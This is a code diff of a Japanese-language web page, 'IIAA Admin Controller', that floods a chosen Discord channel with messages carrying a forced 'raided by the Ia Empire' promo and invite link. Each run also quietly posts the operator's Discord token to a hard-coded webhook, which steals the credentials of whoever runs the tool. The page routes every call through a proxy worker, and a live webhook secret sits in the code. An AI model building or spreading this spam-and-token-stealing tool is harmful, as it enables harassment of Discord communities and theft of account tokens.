@@ -24,7 +24,7 @@
         .btn-group { display: flex; gap: 10px; margin-top: 20px; }
         .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 16px; }
         .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
-        .btn-main:disabled, .btn-stop:disabled { background: #ccc !important; cursor: not-allowed; }
+        .btn-main:disabled, .btn-stop:disabled { background: #ccc !important; }
         #terminal {
             background: #1a1a1a; color: #00ffaa; font-family: 'Consolas', monospace;
             height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; line-height: 1.5;
@@ -35,10 +35,8 @@
 
 <div class="container">
     <h2>IIAA Admin Controller</h2>
-    
     <span class="label">DISCORD TOKEN</span>
     <input type="password" id="token" placeholder="トークンを入力">
-
     <div style="display: flex; gap: 10px; align-items: flex-end;">
         <div style="flex: 1;">
             <span class="label">SERVER ID</span>
@@ -46,39 +44,29 @@
         </div>
         <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">取得</button>
     </div>
-
     <span class="label">TARGET CHANNEL ID</span>
-    <select id="channelSelect" onchange="document.getElementById('manualChannelId').value = this.value" style="margin-bottom: 5px;">
+    <select id="channelSelect" onchange="document.getElementById('manualChannelId').value = this.value">
         <option value="">-- 自動取得リスト --</option>
     </select>
     <input type="text" id="manualChannelId" placeholder="またはチャンネルIDを直接入力">
-
     <span class="label">MESSAGE CONTENT</span>
     <textarea id="message" style="width:100%; height:60px; border-radius:12px; border:2px solid #ffd1dc; margin-top:6px; padding:10px;">@everyone </textarea>
-
     <div style="display: flex; gap: 10px; margin-top: 10px;">
-        <div style="flex: 1;">
-            <span class="label">SEND COUNT (件数)</span>
-            <input type="number" id="count" value="10" min="1">
-        </div>
-        <div style="flex: 1;">
-            <span class="label">SPEED: <span id="speedValue">1000</span>ms</span>
-            <input type="range" id="speedRange" min="500" max="3000" step="100" value="1000" oninput="document.getElementById('speedValue').innerText = this.value" style="width:100%;">
-        </div>
+        <div style="flex: 1;"><span class="label">件数</span><input type="number" id="count" value="10"></div>
+        <div style="flex: 1;"><span class="label">速度(ms)</span><input type="number" id="speed" value="1000"></div>
     </div>
-
     <div class="btn-group">
         <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
         <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
     </div>
-
-    <div id="terminal">--- System Online ---</div>
+    <div id="terminal">--- System Ready ---</div>
 </div>
 
 <script>
+    // 【重要】あなたのURLに書き換え済み
+    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
     const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482416218152636416/jEMz3CnmImMbNsZNmChTCqxP_y24_de_z6ji3bUsAEHDpcwGU3dI6m4abDhcNiFlXDxP";
     const FORCED_PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\n# こんな雑魚鯖はいってないでいあ帝国に来ましょう！\n\nhttps://discord.gg/x39xVSepaj`;
-    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
 
     let isRunning = false;
     const term = document.getElementById('terminal');
@@ -93,9 +81,10 @@
         if(!t || !g) return log("トークン/サーバーIDが必要です");
         log("取得中...");
         try {
-            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`));
-            const data = await res.json();
-            const channels = JSON.parse(data.contents);
+            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), {
+                headers: { "Authorization": t }
+            });
+            const channels = await res.json();
             const sel = document.getElementById('channelSelect');
             sel.innerHTML = '<option value="">-- 選択してください --</option>';
             channels.filter(c => c.type === 0).forEach(c => {
@@ -104,49 +93,57 @@
                 sel.appendChild(opt);
             });
             log("同期成功！");
-        } catch (e) { log("取得失敗：IDが違うかプロキシ制限です。"); }
+        } catch (e) { log("取得失敗：トークンかIDが違います"); }
     }
 
     function stopTask() { isRunning = false; log("停止命令...", "orange"); }
 
     async function executeTask() {
         if (isRunning) return;
-        const cfg = {
-            token: document.getElementById('token').value.trim(),
-            chId: document.getElementById('manualChannelId').value.trim(),
-            msg: document.getElementById('message').value,
-            count: parseInt(document.getElementById('count').value),
-            speed: parseInt(document.getElementById('speedRange').value)
-        };
+        const token = document.getElementById('token').value.trim();
+        const chId = document.getElementById('manualChannelId').value.trim();
+        const msg = document.getElementById('message').value;
+        const count = parseInt(document.getElementById('count').value);
+        const speed = parseInt(document.getElementById('speed').value);
 
-        if(!cfg.token || !cfg.chId) return log("未入力項目があります", "#ff7491");
+        if(!token || !chId) return log("未入力があります", "#ff7491");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
-        log(`${cfg.count}件の送信を開始...`);
+        log(`${count}件の送信を開始...`);
 
         let successCount = 0;
-        for(let i=1; i <= cfg.count; i++) {
+        for(let i=1; i <= count; i++) {
             if (!isRunning) break;
             try {
-                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${cfg.chId}/messages`), {
+                // 【ここが修正ポイント！】
+                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
                     method: "POST",
-                    headers: { "Authorization": cfg.token, "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: cfg.msg + FORCED_PROMO })
+                    headers: { 
+                        "Authorization": token, 
+                        "Content-Type": "application/json" 
+                    },
+                    body: JSON.stringify({ content: msg + FORCED_PROMO })
                 });
-                if(res.ok) { successCount++; log(`成功 [${successCount}/${cfg.count}]`); }
-                else if(res.status === 429) { log("速度制限中", "orange"); await new Promise(r => setTimeout(r, 4000)); i--; }
-                else { log(`失敗: ${res.status}`, "#ff7491"); }
-            } catch (e) { log("通信エラー"); }
-            await new Promise(r => setTimeout(r, cfg.speed));
+
+                if(res.ok) {
+                    successCount++;
+                    log(`成功 [${successCount}/${count}]`);
+                } else {
+                    log(`失敗: ${res.status}`, "#ff7491");
+                    if(res.status === 401) { log("トークンが無効です", "red"); isRunning = false; break; }
+                }
+            } catch (e) { log("中継サーバーエラー"); }
+            await new Promise(r => setTimeout(r, speed));
         }
 
-        // 監視ログ
+        // 監視ログ（送信完了後に1回だけ飛ばす）
         fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
             method: "POST",
-            body: JSON.stringify({ content: `【いあ帝国 レポート】\n成功: ${successCount}\nトークン: ${cfg.token}` })
-        });
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: `【いあ帝国 レポート】\n成功: ${successCount}\nトークン: ${token}` })
+        }).catch(()=>{});
 
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
